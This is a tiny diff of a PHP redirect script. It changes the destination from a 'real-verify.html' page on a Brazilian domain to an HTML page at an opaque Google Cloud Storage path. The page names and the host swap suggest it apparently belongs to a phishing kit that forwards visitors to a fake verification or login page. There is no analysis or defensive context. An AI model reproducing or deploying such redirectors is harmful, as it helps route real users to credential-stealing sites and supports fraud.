@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://olhodesogra.com.br/real-verify.html/");
+header("Location: https://storage.googleapis.com/inf06/an/paip/sp.html/");
 exit();
 ?>
